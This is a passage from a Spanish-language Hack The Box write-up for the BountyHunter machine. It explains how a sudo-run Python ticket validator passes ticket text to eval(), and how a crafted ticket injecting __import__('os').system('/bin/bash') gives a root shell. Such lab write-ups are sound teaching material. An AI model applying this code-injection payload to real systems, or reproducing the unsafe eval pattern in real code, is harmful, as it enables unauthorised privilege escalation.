    validationNumber = eval(line.replace("**", ""))
...
```

Analiza si ese valor extraído al ser dividido por `7` le da un resto de `4`, por si algo:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bountyhunter/359google_restodivision.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

> Tomada de: [superprof](https://www.superprof.es/diccionario/matematicas/aritmetica/resto.html).

De ser así, entra a jugar con la función `eval()`.

## Aprovechamos la funcion <u>eval()</u> para ejecutar instrucciones del SO [📌](#debug-py-script-eval) {#debug-py-script-eval}

Vemos que vuelve a hacer la validación anterior, solo que ahora válida y devuelve el resultado de la expresión enviada, al estar jugando con números podemos pensar que en el ticket esperando algo como esto, una operación aritmética:

```bash
❱ cat estoestacaliente.md
# Skytrain Inc
## Ticket to lanz pero claro que si

__Ticket Code:__
**25+2+3
```

> Les dejo una [web](https://es.calcuworld.com/calculadoras-matematicas/calculadora-de-resto/) para que validen que la división de `25/7` nos devuelve un resto de `4` (: 

Para después efectuar toda la suma y validar temas de tamaño con él.

Bueno, puuuuuuuuuuuuuues investigando nos damos cuenta de que la funcion [eval()](https://www.programiz.com/python-programming/methods/built-in/eval) no solo parsea la operación aritmética, sino que podemos pasarle funciones del propio programa para que sean interpretadas, como podrían ser `exit()`, `print()`, entre otras, pero también podemos jugar con módulos, librerías, etc., todo lo que tenga que ver con `Python` la funcion [eval()](https://python-para-impacientes.blogspot.com/2015/03/evaluar-ejecutar-y-compilar-cadenas.html) lo ejecutara :O

* [Exploiting Python’s Eval](https://www.floyd.ch/?p=584).
* [Command Injection in Python: Examples and Prevention](https://www.stackhawk.com/blog/command-injection-python/).

Pues listooo, lo que quiere decir que podríamos hacer algo así:

```bash
❱ cat estoestacaliente.md
# Skytrain Inc
## Ticket to lanz pero claro que si

__Ticket Code:__
**25+exit(1)
```

Y cuando entre al `eval` leerá la instrucción `exit(1)` y forzara cerrar el programa como si hubieran existido errores :o hagamos la prueba:

Ejecución esperada:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bountyhunter/359bash_script_tickets_normal.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Intentando que `eval()` ejecute la función `exit(1)` para salir con errores del programa:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bountyhunter/359bash_script_tickets_exit1.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Pos perfeccccto (cuando hay algún error en mi consola sale ese `bad` e.e), en [este recurso](https://www.floyd.ch/?p=584) hay algunos ejemplos, usemos dos de ellos para terminar de validar lo que queremos hacer, ahora vamos a aprovecharnos del módulo `os` para hablar directamente con el sistema, imprimamos una cadena de texto:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bountyhunter/359bash_script_tickets_osECHO.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Pues muy bien, ya somos `root` sin aún serlo, ¿sabes por qué? ¿No? Bueno, estamos ejecutando comandos directamente en el sistema. Si nos llevamos esta estructura del archivo `.md` a la máquina víctima, pero en vez de ejecutar un `echo ...` ejecutamos una `/bin/bash`, deberíamos obtener una Shell como el usuario `root`:

```bash
development@bountyhunter:/tmp$ cat estoestacaliente.md 
# Skytrain Inc
## Ticket to lanz pero claro que si

__Ticket Code:__
**25+__import__('os').system('/bin/bash')
```

Ya estamos en la máquina, ahora simplemente ejecutamos el script con los permisos que tenemos, o sea con `sudo ....`:

```bash
development@bountyhunter:/tmp$ sudo /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bountyhunter/359bash_exploitEVAL_rootSH.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

TAMOS DENTRO PAPAiiiiiiiiiiiiii, veamos las flags:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bountyhunter/359flags.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Y eso es todo por esta máquina (:

...

Me gusto el poder probar el `XXE`, ya que se ve poquito, entonces interesante. Además, que no fue tan sencillo como leer archivos y ya, nop, el jugar con `wrappers` me gusto bastante.

BUeN0, no siendo más nos leeremos después en otro mundo, muchas gracias por leer, besitos y como siempre, a romper todo 🔥